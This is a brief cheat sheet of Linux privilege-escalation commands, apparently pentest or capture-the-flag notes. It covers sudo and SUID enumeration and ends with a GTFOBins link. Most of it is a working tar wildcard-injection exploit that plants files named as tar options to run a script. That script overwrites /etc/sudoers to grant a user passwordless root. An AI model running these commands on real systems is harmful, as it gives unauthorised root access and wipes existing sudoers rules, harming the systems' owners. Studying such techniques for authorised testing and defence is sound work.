# Privilege Escalation

## Find the applications that this user can run as sudo
`sudo -l`

## Find files with SUID permissions
`find / -user root -perm -4000 -exec ls -ldb {} \;`
`find / -perm -u=s -type f 2>/dev/null`

## tar exec example
`echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh`
`echo "" > "--checkpoint-action=exec=sh demo.sh"`
`echo "" > --checkpoint=1`
`tar cf archive.tar *`

`tar cf archive.tar --checkpoint=1 --checkpoint-action=exec=sh demo.sh`

## gtfobins
https://gtfobins.github.io/gtfobins/

